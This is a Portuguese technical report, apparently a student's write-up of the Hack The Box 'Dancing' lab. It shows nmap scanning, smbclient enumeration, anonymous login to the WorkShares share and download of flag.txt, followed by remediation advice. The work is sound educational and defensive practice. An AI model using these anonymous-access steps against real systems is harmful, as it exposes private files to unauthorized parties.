# Relatório Técnico de Segurança — HTB Dancing

**Laboratório:** Dancing  
**Plataforma:** Hack The Box (HTB)  
**Categoria:** Starting Point  
**Dificuldade:** Very Easy  
**Sistema operacional alvo:** Windows  
**Área:** Network Enumeration / SMB Enumeration  
**Status:** Compartilhamento SMB acessado e arquivo de flag identificado

---

## 1. Resumo Executivo

Este relatório documenta o processo de reconhecimento, enumeração e análise de segurança realizado no laboratório **Dancing**, disponibilizado pela plataforma Hack The Box.

O objetivo foi identificar serviços expostos na máquina-alvo, investigar possíveis configurações inadequadas no protocolo SMB (*Server Message Block*) e verificar se havia compartilhamentos acessíveis sem autenticação.

Durante a avaliação, foi identificada a porta TCP 445 aberta, associada ao serviço SMB. Posteriormente, a enumeração dos compartilhamentos revelou a existência de um diretório denominado `WorkShares`.

Foi possível estabelecer uma conexão com esse compartilhamento sem fornecer credenciais, utilizando acesso anônimo. Durante a navegação, foram identificados os diretórios `Amy.J` e `James.P`, sendo encontrado o arquivo `flag.txt` dentro do diretório `James.P`.

A atividade demonstrou como configurações inadequadas de permissões e autenticação em compartilhamentos SMB podem expor arquivos internos a usuários não autenticados.

## 2. Objetivo

Realizar uma avaliação prática de segurança em um ambiente controlado, com os seguintes objetivos:

- Identificar portas TCP abertas na máquina-alvo.
- Reconhecer os serviços disponíveis.
- Identificar a presença do protocolo SMB.
- Enumerar os compartilhamentos disponibilizados pelo servidor.
- Verificar a possibilidade de acesso anônimo.
- Investigar os diretórios acessíveis.
- Localizar e identificar o arquivo de flag do laboratório.

## 3. Escopo

A avaliação foi limitada à máquina virtual disponibilizada pelo laboratório Dancing, dentro do ambiente autorizado do Hack The Box.

**Alvo:** Máquina Windows do laboratório Dancing.

**Endereço IP observado:** `10.129.177.52`

**Serviço prioritário:** SMB — TCP/445.

**Ambiente de execução:**
- Sistema operacional de análise: Kali Linux.
- Virtualização: Oracle VirtualBox.
- Conectividade: VPN do Hack The Box.
- Ferramentas: OpenVPN, Nmap e SMBClient.

A atividade foi realizada exclusivamente para fins educacionais, dentro do ambiente controlado da plataforma.

## 4. Metodologia e Procedimentos Técnicos

A metodologia foi dividida em etapas de reconhecimento, enumeração, acesso e identificação de arquivos.

### 4.1. Conexão com a VPN

Inicialmente, foi estabelecida uma conexão entre a máquina Kali Linux e a infraestrutura do Hack The Box utilizando OpenVPN.

Comando utilizado:

```bash
sudo openvpn ~/Downloads/SEU_ARQUIVO.ovpn
```

Após a inicialização, foi verificada a interface de rede criada pela VPN.

```bash
ip a
```

A interface `tun0` foi utilizada como referência para verificar a conexão VPN.

Também foi executado:

```bash
ip route
```

O comando permitiu visualizar as rotas de rede disponíveis no sistema.

**Resultado:** Conexão VPN estabelecida, permitindo a comunicação com a máquina-alvo.

### 4.2. Reconhecimento com Nmap

Após estabelecer a conexão, foi realizada uma varredura para identificar portas abertas e serviços disponíveis.

Comando utilizado:

```bash
nmap -sC -sV 10.129.177.52
```

**Parâmetros utilizados:**

| Parâmetro | Descrição |
|---|---|
| `-sC` | Executa scripts padrão do Nmap. |
| `-sV` | Identifica versões dos serviços. |
| IP | Endereço da máquina-alvo. |

**Resultado obtido:**

```text
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

Também foram identificadas informações adicionais:

```text
smb2-security-mode:
3.1.1:
Message signing enabled but not required
```

**Análise dos resultados:**

| Porta | Serviço | Análise |
|---|---|---|
| 135/TCP | MSRPC | Comunicação remota do Windows. |
| 139/TCP | NetBIOS | Serviço de comunicação em rede. |
| 445/TCP | SMB | Compartilhamento de arquivos e recursos. |
| 5985/TCP | HTTP/WinRM | Serviço associado ao gerenciamento remoto do Windows. |

A porta TCP 445 foi selecionada como principal ponto de investigação por estar associada ao protocolo SMB.

### 4.3. Enumeração dos compartilhamentos SMB

Com a identificação do serviço SMB, foi utilizada a ferramenta SMBClient para listar os compartilhamentos disponíveis.

Comando executado:

```bash
smbclient -L 10.129.177.52 -N
```

**Parâmetros:**

- `smbclient`: cliente SMB utilizado para interagir com servidores de compartilhamento.
- `-L`: lista os compartilhamentos disponíveis.
- `-N`: não solicita senha durante a conexão.

**Resultado obtido:**

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
WorkShares      Disk
```

Foram identificados quatro compartilhamentos:

| Compartilhamento | Tipo | Descrição |
|---|---|---|
| ADMIN$ | Disk | Compartilhamento administrativo do Windows. |
| C$ | Disk | Compartilhamento administrativo do disco C:. |
| IPC$ | IPC | Comunicação entre processos. |
| WorkShares | Disk | Compartilhamento personalizado de arquivos. |

O compartilhamento `WorkShares` foi selecionado para investigação.

Durante a execução, também foi exibida uma mensagem relacionada à tentativa de consulta de grupos de trabalho utilizando SMB1:

```text
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available.
```

Essa mensagem não impediu a enumeração inicial, pois os compartilhamentos já haviam sido identificados.

### 4.4. Acesso anônimo ao compartilhamento

Após identificar o compartilhamento `WorkShares`, foi realizada uma tentativa de conexão sem autenticação.

Comando executado:

```bash
smbclient //10.129.177.52/WorkShares -N
```

A conexão foi estabelecida e apresentou o seguinte prompt:

```text
smb: \>
```

Esse resultado confirmou que o compartilhamento permitia acesso sem a apresentação de credenciais.

**Constatação:** Foi identificado acesso anônimo ao compartilhamento `WorkShares`.

Essa configuração representa um possível risco de exposição de informações, especialmente em ambientes corporativos nos quais compartilhamentos podem armazenar documentos internos.

### 4.5. Enumeração dos diretórios

Após estabelecer a conexão, foi executado o comando:

```bash
ls
```

O resultado apresentou:

```text
.
..
Amy.J
James.P
```

Foram identificados dois diretórios disponíveis:

- `Amy.J`
- `James.P`

O diretório `James.P` foi selecionado para investigação.

Comando utilizado:

```bash
cd James.P
```

Em seguida, foi executado:

```bash
ls
```

**Resultado obtido:**

```text
.
..
flag.txt
```

A enumeração identificou o arquivo `flag.txt` dentro do diretório `James.P`.

### 4.6. Identificação e transferência da flag

Para realizar a transferência do arquivo do servidor SMB para a máquina Kali Linux, foi utilizado o comando interno `get` do SMBClient.

```bash
get flag.txt
```

Após a transferência, a sessão SMB pode ser encerrada com:

```bash
exit
```

E o conteúdo do arquivo pode ser consultado localmente com:

```bash
cat flag.txt
```

**Observação:** O arquivo foi localizado durante a avaliação. A execução e a confirmação da leitura local da flag ainda precisam ser registradas para documentar a conclusão integral dessa etapa.

## 5. Vulnerabilidade e Risco Identificado

### 5.1. Compartilhamento SMB com acesso anônimo

A principal condição de segurança identificada foi a possibilidade de acessar o compartilhamento `WorkShares` sem autenticação.

Essa configuração pode permitir que usuários não autenticados visualizem ou obtenham arquivos disponibilizados no compartilhamento.

**Possíveis impactos:**

- Exposição de documentos internos.
- Acesso indevido a informações corporativas.
- Vazamento de dados.
- Comprometimento da confidencialidade das informações.

**Classificação técnica:** Configuração inadequada de controle de acesso em compartilhamento SMB.

**Referência conceitual:** CWE-284 — Improper Access Control.

A classificação de severidade em ambientes reais dependeria da sensibilidade dos arquivos, da exposição da rede e das permissões efetivamente concedidas.

## 6. Recomendações de Segurança

Para reduzir os riscos associados à configuração identificada, recomenda-se:

1. Desabilitar o acesso anônimo aos compartilhamentos SMB sempre que não houver necessidade operacional.
2. Exigir autenticação para acessar recursos compartilhados.
3. Aplicar o princípio do menor privilégio, concedendo apenas as permissões necessárias a cada usuário.
4. Revisar periodicamente os compartilhamentos existentes.
5. Restringir o acesso SMB por meio de regras de firewall e segmentação de rede.
6. Monitorar tentativas de acesso não autenticado.
7. Avaliar a necessidade de exigir assinatura SMB.
8. Manter os sistemas Windows atualizados e utilizar versões seguras do protocolo SMB.

## 7. Ferramentas Utilizadas

| Ferramenta | Finalidade |
|---|---|
| OpenVPN | Estabelecimento da conexão VPN com o HTB. |
| Nmap | Reconhecimento de portas e serviços. |
| SMBClient | Enumeração e acesso aos compartilhamentos SMB. |
| Terminal Kali Linux | Execução dos comandos e análise dos resultados. |

## 8. Principais Comandos Executados

```bash
# Verificar interfaces de rede
ip a

# Verificar rotas de rede
ip route

# Reconhecimento de portas e serviços
nmap -sC -sV 10.129.177.52

# Listar compartilhamentos SMB sem senha
smbclient -L 10.129.177.52 -N

# Acessar o compartilhamento WorkShares
smbclient //10.129.177.52/WorkShares -N

# Listar diretórios
ls

# Entrar no diretório James.P
cd James.P

# Baixar o arquivo encontrado
get flag.txt

# Encerrar a sessão SMB
exit

# Ler o arquivo localmente
cat flag.txt
```

## 9. Conhecimentos Desenvolvidos

Durante a execução do laboratório, foram praticados os seguintes conceitos:

- Configuração e utilização de VPN em ambientes de laboratório.
- Reconhecimento de redes utilizando Nmap.
- Identificação de portas e serviços em sistemas Windows.
- Funcionamento do protocolo SMB.
- Enumeração de compartilhamentos de rede.
- Identificação de permissões e acessos anônimos.
- Navegação em diretórios remotos.
- Transferência de arquivos utilizando SMBClient.
- Análise de riscos relacionados à exposição de informações.

## 10. Conclusão

O laboratório Dancing proporcionou uma experiência prática de reconhecimento e enumeração de serviços em um ambiente Windows.

A partir da utilização do Nmap, foi possível identificar a porta 445 aberta, direcionando a investigação para o protocolo SMB.

Posteriormente, a ferramenta SMBClient permitiu enumerar os compartilhamentos disponíveis e identificar o diretório `WorkShares`, que aceitava conexões sem autenticação.

A navegação pelo compartilhamento revelou os diretórios `Amy.J` e `James.P`, sendo encontrado o arquivo `flag.txt` no segundo diretório.

O principal aprendizado foi compreender como configurações inadequadas de autenticação e permissões em serviços SMB podem permitir o acesso não autorizado a arquivos.

A atividade reforçou a importância do reconhecimento, da enumeração e da análise de permissões como etapas fundamentais em avaliações de segurança da informação.

---

**Responsável pelo estudo:** Tuany Fonseca  
**Plataforma de prática:** Hack The Box  
**Laboratório:** Dancing  
**Finalidade:** Estudo prático de cibersegurança e desenvolvimento de habilidades em Pentest.

**Status da documentação:** Processo de reconhecimento, enumeração e localização do arquivo documentados. Confirmação da leitura da flag pendente.